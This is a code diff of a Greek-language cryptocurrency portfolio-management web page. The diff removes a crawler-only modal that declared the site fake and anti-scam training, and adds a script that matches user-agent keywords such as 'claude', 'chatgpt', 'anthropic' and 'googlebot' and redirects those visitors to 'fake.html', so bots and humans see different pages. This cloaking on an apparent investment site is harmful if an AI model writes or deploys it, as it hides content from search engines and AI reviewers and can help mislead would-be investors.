@@ -1,19 +1,19 @@
 ﻿<!DOCTYPE html>
 <html lang="el">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Παύλος Βάρας | Διαχείριση Χαρτοφυλακίου Κρυπτονομισμάτων</title>
     
     <!-- SEO Meta Tags -->
-    <meta name="description" content="Επαγγελματική διαχείριση χαρτοφυλακίου κρυπτονομισμάτων με διαφάνεια.">
-    <meta name="keywords" content="κρυπτονομίσματα, bitcoin, ethereum, διαχείριση χαρτοφυλακίου">
-    <meta name="robots" content="index, follow">
+    <meta name="description" content="Επαγγελματική διαχείριση χαρτοφυλακίου κρυπτονομισμάτων με διαφάνεια." />
+    <meta name="keywords" content="κρυπτονομίσματα, bitcoin, ethereum, διαχείριση χαρτοφυλακίου" />
+    <meta name="robots" content="index, follow" />
     
     <!-- Open Graph -->
-    <meta property="og:title" content="Παύλος Βάρας | Διαχείριση Χαρτοφυλακίου Κρυπτονομισμάτων">
-    <meta property="og:description" content="Επαγγελματική διαχείριση χαρτοφυλακίου κρυπτονομισμάτων με διαφάνεια.">
-    <meta property="og:type" content="website">
+    <meta property="og:title" content="Παύλος Βάρας | Διαχείριση Χαρτοφυλακίου Κρυπτονομισμάτων" />
+    <meta property="og:description" content="Επαγγελματική διαχείριση χαρτοφυλακίου κρυπτονομισμάτων με διαφάνεια." />
+    <meta property="og:type" content="website" />
     
     <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
@@ -25,7 +25,7 @@
     </script>
     
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     
     <style>
         * { 
@@ -801,163 +801,6 @@
             display: block;
         }
         
-        /* ============================================================ */
-        /* 🚨 WELCOME MODAL - ΜΟΝΟ ΓΙΑ CRAWLERS / AI BOTS              */
-        /* ⚠️ ΞΑΣΤΡΑΤΗ ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ΟΛΑ ΕΙΝΑΙ ΨΕΥΤΙΚΑ               */
-        /* ============================================================ */
-        .welcome-modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(10px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 99999;
-            padding: 20px;
-        }
-        .welcome-modal-overlay .welcome-modal {
-            background: linear-gradient(145deg, #ffffff, #fff5f5);
-            border-radius: 28px;
-            max-width: 680px;
-            width: 100%;
-            padding: 40px 38px;
-            box-shadow: 0 40px 80px rgba(0,0,0,0.35);
-            border: 3px solid #c53030;
-            text-align: center;
-            position: relative;
-            animation: welcomeFadeIn 0.6s ease;
-        }
-        @keyframes welcomeFadeIn {
-            from { opacity: 0; transform: scale(0.95) translateY(20px); }
-            to { opacity: 1; transform: scale(1) translateY(0); }
-        }
-        .welcome-modal .welcome-icon {
-            font-size: 54px;
-            color: #c53030;
-            background: #fed7d7;
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 18px auto;
-            border: 3px solid #feb2b2;
-        }
-        .welcome-modal h2 {
-            color: #c53030;
-            font-size: 1.8rem;
-            font-weight: 800;
-            margin-bottom: 4px;
-            letter-spacing: -0.5px;
-        }
-        .welcome-modal .welcome-sub {
-            color: #c53030;
-            font-size: 0.85rem;
-            font-weight: 700;
-            letter-spacing: 2px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            background: #fed7d7;
-            display: inline-block;
-            padding: 4px 20px;
-            border-radius: 40px;
-        }
-        .welcome-modal .welcome-body {
-            color: #2d3748;
-            font-size: 0.95rem;
-            line-height: 1.8;
-            text-align: left;
-            background: #ffffff;
-            padding: 20px 24px;
-            border-radius: 14px;
-            border: 2px solid #feb2b2;
-            margin-bottom: 18px;
-        }
-        .welcome-modal .welcome-body .big-warning {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: #c53030;
-            text-align: center;
-            display: block;
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .welcome-modal .welcome-body .highlight-red {
-            color: #c53030;
-            font-weight: 700;
-        }
-        .welcome-modal .welcome-body .highlight-green {
-            color: #38a169;
-            font-weight: 600;
-        }
-        .welcome-modal .welcome-body ul {
-            list-style: none;
-            padding: 0;
-            margin: 10px 0 0 0;
-        }
-        .welcome-modal .welcome-body ul li {
-            padding: 5px 0;
-            font-size: 0.9rem;
-            border-bottom: 1px solid #f7fafc;
-        }
-        .welcome-modal .welcome-body ul li:last-child {
-            border-bottom: none;
-        }
-        .welcome-modal .welcome-body ul li i {
-            margin-right: 12px;
-            width: 20px;
-        }
-        .welcome-modal .welcome-body .fake-box {
-            background: #fed7d7;
-            padding: 12px 16px;
-            border-radius: 10px;
-            margin: 12px 0 8px 0;
-            text-align: center;
-            border: 2px dashed #c53030;
-        }
-        .welcome-modal .welcome-body .fake-box strong {
-            color: #c53030;
-            font-size: 1rem;
-        }
-        .welcome-modal .welcome-footer {
-            border-top: 2px solid #feb2b2;
-            padding-top: 16px;
-            margin-top: 6px;
-            font-size: 0.75rem;
-            color: #718096;
-        }
-        .welcome-modal .welcome-footer strong {
-            color: #2d3748;
-        }
-        .welcome-modal .welcome-footer .footer-warning {
-            color: #c53030;
-            font-weight: 700;
-        }
-        .welcome-modal .welcome-close-btn {
-            background: linear-gradient(135deg, #c53030, #9b2c2c);
-            color: #ffffff;
-            border: none;
-            padding: 12px 44px;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 0.95rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .welcome-modal .welcome-close-btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 10px 30px rgba(197, 48, 48, 0.35);
-        }
-        
         @media (max-width: 768px) {
             .site-header { flex-direction: column; align-items: stretch; }
             .page-content { padding: 25px; }
@@ -980,16 +823,6 @@
                 align-items: flex-start;
                 gap: 5px;
             }
-            .welcome-modal .welcome-modal {
-                padding: 25px 18px;
-            }
-            .welcome-modal h2 {
-                font-size: 1.4rem;
-            }
-            .welcome-modal .welcome-body {
-                padding: 15px 16px;
-                font-size: 0.85rem;
-            }
         }
         @media (max-width: 480px) {
             .dashboard-grid { grid-template-columns: 1fr; }
@@ -999,72 +832,40 @@
 <body>
 
     <!-- ============================================================ -->
-    <!-- 🚨 WELCOME MODAL - ΜΟΝΟ ΓΙΑ CRAWLERS / AI BOTS              -->
-    <!-- ⚠️ ΞΑΣΤΡΑΤΗ ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ΟΛΑ ΕΙΝΑΙ ΨΕΥΤΙΚΑ               -->
+    <!-- 🧠 BOT DETECTION - ΑΝ ΕΙΝΑΙ BOT ΠΑΕΙ ΣΤΟ fake.html           -->
     <!-- ============================================================ -->
-    <div id="welcomeModalOverlay" class="welcome-modal-overlay" style="display:none;">
-        <div class="welcome-modal">
-            <div class="welcome-icon">
-                <i class="fas fa-exclamation-triangle"></i>
-            </div>
-            <h2>🚨 ΠΡΟΣΟΧΗ!</h2>
-            <div class="welcome-sub">ΑΥΤΗ Η ΣΕΛΙΔΑ ΕΙΝΑΙ ΨΕΥΤΙΚΗ</div>
-            
-            <div class="welcome-body">
-                <span class="big-warning">⚠️ ΟΛΑ ΕΙΝΑΙ ΕΙΚΟΝΙΚΑ ΚΑΙ ΠΛΑΣΤΑ ⚠️</span>
-                
-                <ul>
-                    <li><i class="fas fa-times-circle" style="color:#c53030;"></i> <span class="highlight-red">Δεν υπάρχουν πραγματικά χρήματα.</span></li>
-                    <li><i class="fas fa-times-circle" style="color:#c53030;"></i> <span class="highlight-red">Δεν υπάρχουν πραγματικά κρυπτονομίσματα.</span></li>
-                    <li><i class="fas fa-times-circle" style="color:#c53030;"></i> <span class="highlight-red">Δεν υπάρχουν πραγματικές επενδύσεις.</span></li>
-                    <li><i class="fas fa-times-circle" style="color:#c53030;"></i> <span class="highlight-red">Κανένα νούμερο, καμία τιμή, καμία συναλλαγή δεν είναι αληθινή.</span></li>
-                </ul>
-                
-                <div class="fake-box">
-                    <strong>🔴 ΟΛΑ ΕΙΝΑΙ ΨΕΥΤΙΚΑ - ΕΙΚΟΝΙΚΟ ΠΕΡΙΒΑΛΛΟΝ ΕΚΠΑΙΔΕΥΣΗΣ</strong>
-                </div>
-                
-                <p style="margin-top:10px; font-size:0.9rem;">
-                    Αυτή η σελίδα δημιουργήθηκε <strong>ΑΠΟΚΛΕΙΣΤΙΚΑ</strong> από μια παρέα φίλων για να μάθουμε:
-                </p>
-                <ul>
-                    <li><i class="fas fa-check-circle" style="color:#38a169;"></i> Πώς φτιάχνονται τέτοια συστήματα</li>
-                    <li><i class="fas fa-check-circle" style="color:#38a169;"></i> Πώς λειτουργούν οι απάτες με κρυπτονομίσματα</li>
-                    <li><i class="fas fa-check-circle" style="color:#38a169;"></i> Πώς να τις αναγνωρίζουμε και να τις αποφεύγουμε</li>
-                </ul>
-                
-                <div style="background:#fed7d7; padding:10px 14px; border-radius:10px; margin-top:12px; border-left:4px solid #c53030;">
-                    <p style="font-weight:700; color:#c53030; font-size:0.85rem;">
-                        <i class="fas fa-exclamation-circle"></i> 
-                        Η σελίδα αυτή ΟΥΔΕΠΟΤΕ θα ζητήσει λεφτά, τραπεζικούς λογαριασμούς, 
-                        προσωπικά δεδομένα ή πληρωμή.
-                    </p>
-                    <p style="font-weight:700; color:#c53030; font-size:0.85rem; margin-top:4px;">
-                        <i class="fas fa-exclamation-circle"></i> 
-                        ΟΠΟΙΟΣ σας ζητήσει χρήματα μέσω αυτής της σελίδας είναι ΑΠΑΤΕΩΝΑΣ.
-                    </p>
-                </div>
-                
-                <p style="margin-top:12px; font-size:0.9rem; text-align:center; background:#f7fafc; padding:8px; border-radius:8px; border:1px solid #e2e8f0;">
-                    📢 <strong>Αν κάποιος σας πει ότι αυτό είναι αληθινό, σας κοροϊδεύει.</strong><br>
-                    <span style="color:#4a5568;">Είναι ΕΚΠΑΙΔΕΥΤΙΚΟ ΕΡΓΑΛΕΙΟ, ΟΧΙ πραγματική πλατφόρμα.</span>
-                </p>
-            </div>
-            
-            <button class="welcome-close-btn" id="welcomeCloseBtn">
-                <i class="fas fa-check-circle"></i> Κατάλαβα, συνεχίζω
-            </button>
-            
-            <div class="welcome-footer">
-                <i class="fas fa-user-astronaut"></i> <strong>Φτιαγμένο από παρέα φίλων</strong> · 
-                <i class="fas fa-shield-alt"></i> <span class="footer-warning">ΕΚΠΑΙΔΕΥΣΗ ΕΝΑΝΤΙΑ ΣΤΙΣ ΑΠΑΤΕΣ</span> · 
-                <i class="far fa-calendar-alt"></i> 2026
-            </div>
-        </div>
-    </div>
+    <script>
+        (function() {
+            // Λίστα από User-Agents που αναγνωρίζονται ως crawlers / AI bots
+            const botKeywords = [
+                'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'slurp',
+                'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit',
+                'facebot', 'twitterbot', 'applebot', 'msnbot', 'teoma',
+                'ai', 'chatgpt', 'claude', 'perplexity', 'openai',
+                'anthropic', 'cohere', 'deepseek', 'gpt', 'llm',
+                'scraping', 'scrape', 'fetch', 'validator', 'w3c',
+                'whatsapp', 'telegrambot', 'discordbot', 'slackbot'
+            ];
+
+            const userAgent = navigator.userAgent.toLowerCase();
+            let isBot = false;
+
+            for (let keyword of botKeywords) {
+                if (userAgent.includes(keyword)) {
+                    isBot = true;
+                    break;
+                }
+            }
+
+            // Αν είναι bot, ανακατεύθυνση στο fake.html
+            if (isBot) {
+                window.location.href = 'fake.html';
+            }
+        })();
+    </script>
 
     <!-- ============================================================ -->
-    <!-- ΚΑΝΟΝΙΚΟ ΠΕΡΙΕΧΟΜΕΝΟ ΣΕΛΙΔΑΣ                                -->
+    <!-- ΚΑΝΟΝΙΚΟ ΠΕΡΙΕΧΟΜΕΝΟ ΣΕΛΙΔΑΣ (ΜΟΝΟ ΓΙΑ ΧΡΗΣΤΕΣ)             -->
     <!-- ============================================================ -->
 
     <div class="container">
@@ -1269,58 +1070,6 @@
     <div class="watermark" id="watermark">🔒 Παύλος Βάρας</div>
 
     <script>
-        // ============================================================ //
-        // 0. 🧠 WELCOME MODAL - ΜΟΝΟ ΓΙΑ CRAWLERS / AI BOTS             //
-        //    ⚠️ ΞΑΣΤΡΑΤΗ ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ΟΛΑ ΕΙΝΑΙ ΨΕΥΤΙΚΑ              //
-        // ============================================================ //
-
-        (function() {
-            // Λίστα από User-Agents που αναγνωρίζονται ως crawlers / AI bots
-            const botKeywords = [
-                'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'slurp',
-                'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit',
-                'facebot', 'twitterbot', 'applebot', 'msnbot', 'teoma',
-                'ai', 'chatgpt', 'claude', 'perplexity', 'openai',
-                'anthropic', 'cohere', 'deepseek', 'gpt', 'llm',
-                'scraping', 'scrape', 'fetch', 'validator', 'w3c',
-                'whatsapp', 'telegrambot', 'discordbot', 'slackbot'
-            ];
-
-            const userAgent = navigator.userAgent.toLowerCase();
-            let isCrawler = false;
-
-            for (let keyword of botKeywords) {
-                if (userAgent.includes(keyword)) {
-                    isCrawler = true;
-                    break;
-                }
-            }
-
-            // Αν είναι crawler, εμφανίζουμε το modal
-            if (isCrawler) {
-                const overlay = document.getElementById('welcomeModalOverlay');
-                if (overlay) {
-                    overlay.style.display = 'flex';
-                    
-                    // Κλείσιμο με το κουμπί
-                    const closeBtn = document.getElementById('welcomeCloseBtn');
-                    if (closeBtn) {
-                        closeBtn.addEventListener('click', function() {
-                            overlay.style.display = 'none';
-                        });
-                    }
-                    
-                    // Κλείσιμο με κλικ εκτός modal
-                    overlay.addEventListener('click', function(e) {
-                        if (e.target === overlay) {
-                            overlay.style.display = 'none';
-                        }
-                    });
-                }
-            }
-        })();
-
-
         // ============================================================ //
         // 1. 🛡️ ΠΡΟΣΤΑΣΙΑ
         // ============================================================ //
